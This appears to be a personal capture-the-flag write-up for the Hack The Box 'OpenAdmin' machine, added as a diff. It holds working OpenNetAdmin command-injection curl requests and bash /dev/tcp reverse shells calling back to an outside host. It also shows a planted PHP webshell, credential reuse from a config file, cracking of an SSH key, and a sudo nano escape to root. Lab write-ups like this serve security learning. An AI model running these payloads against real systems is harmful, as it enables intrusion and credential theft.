@@ -1,0 +1,222 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.171 
+result: 
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.171
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.16 (94%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+command: gobuster dir -u http://10.10.10.171 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -o gobuster-root-php_txt_html
+result:
+===============================================================
+2023/06/15 22:09:52 Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 10918]
+/.php                 (Status: 403) [Size: 277]
+/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
+/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
+
+access: http://10.10.10.171/
+access: http://10.10.10.171/music/
+access: http://10.10.10.171/ona/
+
+command: searchsploit OpenNetAdmin 
+result:
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                                     | php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                      | php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                                       | php/webapps/47691.sh
+---------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+access: https://www.exploit-db.com/exploits/47691, then read it.
+take attention
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+
+let's create out curl exploit:
+command: curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" http://10.10.10.171/ona/
+result: 
+<pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+
+command: nc -lvnp 7979
+command: curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F7979%200%3E%261%27&xajaxargs[]=ping" http://10.10.10.171/ona/
+
+command: /var/www/html/ona/local/config
+command: cat database_settings.inc.php
+result:
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+?>
+
+command: python3 -c 'import pty;pty.spawn("/bin/bash")'
+command: su jimmy
+password: n1nj4W4rri0R!
+
+command: cd /etc/apache2/sites-enabled
+command: cat openadmin.conf
+command: cat internal.conf
+result:
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+<IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+
+let's ssh tunneling.
+
+command: ssh jimmy@10.10.10.171 -L 52846:localhost:52846
+password: n1nj4W4rri0R!
+
+access: http://127.0.0.1:52846/
+command: cd /var/www/internal
+command: echo '<?php system($_GET["0xdf"]); ?>' > 0xdf.php
+
+command: curl http://127.0.0.1:52846/0xdf.php?0xdf=id
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+
+command: nc -lvnp 7979
+command: curl http://127.0.0.1:52846/0xdf.php?0xdf=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F7979%200%3E%261%27
+
+command: id && whoami
+id && whoami
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+
+command: cat index.php
+result:
+if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';
+                  header("Location: /main.php");
+              } else {
+                  $msg = 'Wrong username or password.';
+              }
+            }
+
+access: https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
+password: Revealed
+
+access: http://127.0.0.1:52846/
+username: jimmy
+password: Revealed
+
+let's crack it:
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+
+create joanna-enc with above KEY
+command: openssl rsa -in joanna-enc -out id_rsa_openadmin_joanna
+password ? 
+
+command: ssh2john joanna-enc > joanna-enc.john 
+command: john --wordlist=/home/donika/Documents/hackthebox/26_postman_easy/rockyou.txt joanna-enc.john 
+
+command: john --show joanna-enc.john                                                                  
+joanna-enc:bloodninjas
+1 password hash cracked, 0 left
+
+command: openssl rsa -in joanna-enc -out id_rsa_openadmin_joanna
+password:  bloodninjas
+
+command: ssh -i id_rsa_openadmin_joanna joanna@10.10.10.171
+
+command: cat user.txt 
+8f641f5afcedcdb067c1f235760560d2
+
+command: sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
+    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+
+command: sudo /bin/nano /opt/priv
+ctrl+r and ctrl+x
+
+type this: reset; /bin/sh 1>&0 2>&0 then enter
+command: id && whoami
+
+id && whoami                                            M-F New Buffer
+uid=0(root) gid=0(root) groups=0(root)
+root
+
+command: cat /root/root.txt
+212459b60b7a650ed03102cd822b2f42
+
+resource: 
+https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html#path-1-webshell
